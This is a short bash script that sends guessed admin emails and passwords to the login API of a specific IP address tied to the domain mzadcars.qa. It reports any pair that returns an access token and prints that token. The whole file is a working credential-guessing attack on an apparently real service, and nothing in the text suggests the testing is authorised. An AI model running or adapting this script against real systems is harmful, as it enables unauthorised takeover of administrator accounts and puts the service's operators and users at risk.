#!/usr/bin/env bash
set -e
BASE="http://174.165.78.29:8090/api"

try_login() {
  local email="$1" pass="$2"
  local res
  res=$(curl -sf -X POST "$BASE/auth/login" \
    -H 'Content-Type: application/json' \
    -d "{\"login\":\"$email\",\"password\":\"$pass\"}" 2>/dev/null)
  if echo "$res" | grep -q "access_token"; then
    echo "FOUND: $email / $pass"
    echo "$res"
    exit 0
  fi
}

try_login "admin@mzadcars.qa"    "Admin#1234"
try_login "admin@mzadcars.qa"    "Admin1234!"
try_login "admin@mzadcars.qa"    "Admin1234"
try_login "newadmin@mzadcars.qa" "Admin1234"
try_login "newadmin@mzadcars.qa" "Admin#1234"
try_login "newadmin@mzadcars.qa" "Admin1234!"
try_login "superadmin@mzadcars.qa" "Admin1234!"
try_login "sa@mzadcars.qa"       "Admin1234!"

echo "No admin credentials found"
